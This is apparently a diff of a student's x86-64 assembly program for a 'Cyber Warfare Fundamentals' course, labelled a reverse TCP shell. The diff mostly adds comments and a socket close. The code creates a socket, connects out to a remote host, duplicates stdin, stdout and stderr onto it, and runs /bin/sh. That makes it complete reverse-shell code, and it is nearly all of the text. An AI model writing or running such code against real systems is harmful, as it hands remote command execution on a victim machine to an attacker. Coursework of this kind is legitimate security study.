@@ -1,20 +1,25 @@
 ;Lab3_3 Remote Hello World
+;Christian Sylvester
+;CS495Z - Cyber Warfare Fundamentals
+;Pex1 - Reverse TCP Shell Shoveler with x86-64
 SECTION .data
-	msg: db "/bin/sh", 0
-	errExit: db "There was an error.  Please check the debugger.", 10, 0
-	cleanExit: db "The program exited without error.", 10, 0
+	msg: db "/bin/sh", 0		;path to shell (points to /bin/dash)
+	errExit: db "There was an error.  Please check the debugger.", 10, 0	;Error message for when the socket call fails
+	cleanExit: db "The program exited without error.", 10, 0		;Message to be displayed on clean exit
 
 SECTION .text
 global _start
 
 _start:
+	;Create the socket
 	mov rax, 41			;socket call code
 	mov rdi, 2			;inet
 	mov rsi, 1			;sock_stream
 	mov rdx, 0			;protocol
 	syscall				;sys_socket
 	cmp rax, 0			;check for error return
-	jl .error
+	jl .error			;Jumps to error process
+	;Connect to the socket
 	mov r12, rax			;fd
 	mov rax, 42			;connect call code
 	mov rdx, 16			;addrlen
@@ -26,36 +31,41 @@ _start:
 	mov rdi, r12			;move fd into rdi for parameter
 	syscall 			;sys_connect
 	cmp rax, 0			;check for error return
-	jl .error
+	jl .error			;Jumps to error process
+	;Duplicate stdin, stdout, and stderr
 	mov rax, 33			;indicates dup2
 	mov rsi, 0			;move old file descriptor to new param
 	mov rdi, r12			;indicate file descriptor
 	syscall				;dup2 for stdin
 	cmp rax, 0			;check for error return
-	jl .error
+	jl .error			;Jumps to error process
 	mov rax, 33			;indicates dup2
 	mov rsi, 1			;move stdout
 	mov rdi, r12			;indicate file descriptor
 	syscall				;dup2 for stdout
 	cmp rax, 0			;check for error return
-	jl .error
+	jl .error			;Jumps to error process
 	mov rax, 33			;indicates dup2
 	mov rsi, 2			;mov stderr
 	mov rdi, r12			;indicate file descriptor
 	syscall				;dup2 for stderr
 	cmp rax, 0			;check for error return
-	jl .error
+	jl .error			;jumps to error process
+	;Execute the shell
 	mov rax, 59			;execve call code
 	mov rdi, msg			;send /bin/sh
 	xor rsi, rsi			;zero out rsi
-	;mov rdx, 7			;length of msg
 	xor rdx, rdx			;zero out rdx
-	;mov r10, 0			;flags
-	;mov r8, [rsp]			;sock_addr
-	;mov r9, 0x10			;addrlen
 	syscall 			;sys_execve
 	cmp rax, 0			;check for error return
 	jl .error			;go to the error print
+	;Close the Socket
+	mov rax, 3			;close call code
+	mov rdi, r12			;choose the fd (of the socket) to close
+	syscall				;sys_close
+	cmp rax, 0			;checks for errors
+	jl .error			;jumps to error exit
+	;Prepare to exit the program
 	mov rax, 1			;write call code
 	mov rdi, 1			;stdout
 	mov rsi, cleanExit		;send the clean exit message
@@ -65,7 +75,7 @@ _start:
 	jmp .exit			;exit cleanly at end of program
 .exit:
 	mov rax, 60			;exit call code
-	syscall ;sys_exit
+	syscall				;sys_exit
 .error:
 	mov r13, rax			;error code for storage
 	mov rax, 1			;write call code
